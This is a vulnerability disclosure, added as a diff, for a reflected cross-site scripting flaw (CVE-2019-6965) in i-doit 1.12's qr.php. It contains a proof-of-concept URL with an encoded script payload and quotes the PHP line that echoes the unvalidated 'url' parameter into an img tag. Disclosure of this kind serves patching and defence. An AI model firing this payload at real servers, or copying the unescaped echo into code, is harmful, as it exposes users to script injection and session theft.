@@ -1,0 +1,70 @@
+# Exploit Title: i-doit 1.12 Cross Site Scripting on qr.php file
+# Date: 28-03-2019
+# Software Link: https://www.i-doit.org/
+# Version: 1.12
+# Exploit Author: BlackFog Team
+# Contact: info@securelayer7.net
+# Website: https://securelayer7.net
+# Category: webapps
+# Tested on: Firefox in Kali Linux.
+# CVE: CVE-2019-6965
+
+
+
+
+Vendor Description
+==================
+i-doit offers you a professional IT-documentation solution based on ITIL
+guidelines. You can document IT systems and their changes, define emergency
+plans, display vital information and ensure a stable and efficient
+operation of IT networks.
+
+
+
+Attack Type
+==================
+Reflected Cross Site Scripting on qr.php file in URL perameter reported By
+Touhid M.Shaikh(@touhidshaikh22).
+
+
+
+Proof of Concept
+==================
+https://IP_ADDRESS/src/tools/php/qr/qr.php?url=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+
+
+Vulnerable Code.
+==================
+---------------------------------- qr.php Source Code
+-----------------------------
+
+..................................... SNIP
+........................................
+$l_url = @$_GET['url'];                                    <--- Vulnerable
+Perameter
+
+..................................... SNIP
+........................................
+
+<img id="code" src="<?php echo $l_url; ?>images/ajax-loading.gif"
+alt="Error loading the QR Code" /> <--- Display  Here without any
+validation.
+
+ ------------------------------qr.php Source Code ends
+---------------------------
+
+
+
+Fixed
+======
+Update to latest
+
+
+Timeline
+========
+10 Jan, 2018 === Update to Customer
+11 Jan, 2018 === Got Mail to Trigger the issue and we are able to repoduce
+the same.
+15 Jan, 2018 === Provided Hotfix.
+17 Jan, 2018 === Got Thanks for responsible disclosure and agree to publish
+on public.
